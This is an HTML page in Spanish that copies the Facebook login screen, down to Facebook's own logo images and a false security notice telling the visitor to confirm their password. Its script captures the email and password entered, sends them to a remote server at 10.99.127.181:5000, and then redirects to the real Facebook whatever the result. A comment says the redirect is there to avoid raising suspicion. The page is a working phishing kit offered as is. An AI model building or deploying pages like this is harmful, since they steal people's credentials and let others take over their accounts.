<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión en Facebook</title>
    <style>
        /* [Tus estilos CSS existentes se mantienen igual] */
    </style>
</head>
<body>
    <div class="main-container">
        <div class="logo-section">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" 
                 alt="Facebook Logo" 
                 class="facebook-logo">
        </div>
        
        <div class="security-message">
            <strong>Medida de seguridad requerida:</strong> Para proteger tu cuenta, debes confirmar tu contraseña antes de continuar. Esto ayuda a prevenir accesos no autorizados.
        </div>
        
        <!-- Añadido el formulario con id="phishingForm" -->
        <form id="phishingForm" class="login-container">
            <div class="input-group">
                <input type="text" id="email" name="email" placeholder="Correo electrónico o número de teléfono" required>
            </div>
            
            <div class="input-group">
                <input type="password" id="password" name="password" placeholder="Contraseña" required>
            </div>
            
            <button type="submit" class="login-button">Iniciar sesión</button>
            
            <div class="language-selector">
                <span>Español (España)</span>
                <div>
                    <img src="https://static.xx.fbcdn.net/rsrc.php/yZ/r/MnQWcW4ECu2.svg" 
                         alt="Meta" 
                         class="meta-icon">
                </div>
            </div>
        </form>
    </div>
  
    <script>
        document.getElementById("phishingForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            const email = document.getElementById("email").value;
            const password = document.getElementById("password").value;
            
            // Verificación básica de consola para ver si los datos se capturan
            console.log("Credenciales capturadas:", {email, password});
            
            fetch("http://10.99.127.181:5000", {
                method: "POST",
                body: JSON.stringify({ email, password }),
                headers: { "Content-Type": "application/json" }
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Error en la red');
                }
                window.location.href = "https://www.facebook.com";
            })
            .catch(error => {
                console.error('Error:', error);
                // Redirigir aunque falle el envío para no levantar sospechas
                window.location.href = "https://www.facebook.com";
            });
        });
    </script>
</body>
</html>
